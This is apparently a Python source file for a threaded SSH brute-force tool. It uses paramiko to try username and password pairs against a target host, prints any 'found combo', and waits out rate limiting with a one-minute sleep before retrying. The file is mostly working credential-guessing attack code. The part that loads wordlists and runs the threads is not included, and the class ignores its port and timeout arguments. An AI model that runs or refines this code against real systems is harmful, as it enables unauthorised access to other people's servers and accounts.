import sys
from threading import Thread
import paramiko
import socket
import time
from colorama import init, Fore

init()
GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE
# Check For Paramiko Dependency

class Connection(Thread):
    def __init__(self, username, password, targetIp, portNumber, timeoutTime):
        super(Connection, self).__init__()
        self.username = username[1]
        self.password = password[1]
        self.targetIp = targetIp
        self.portNumber = portNumber
        self.timeoutTime = timeoutTime
        self.status = ""

    def run(self):
        if(is_ssh_open(self.targetIp,self.username,self.password)):
            self.status = 'Succeeded'
        else:
            self.status = 'Failed'

def is_ssh_open(hostname, username, password):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password,timeout=3)
    except socket.timeout:
        # this is when host is unreachable
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # sleep for a minute
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        # connection was established successfully
        print("yaha")
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True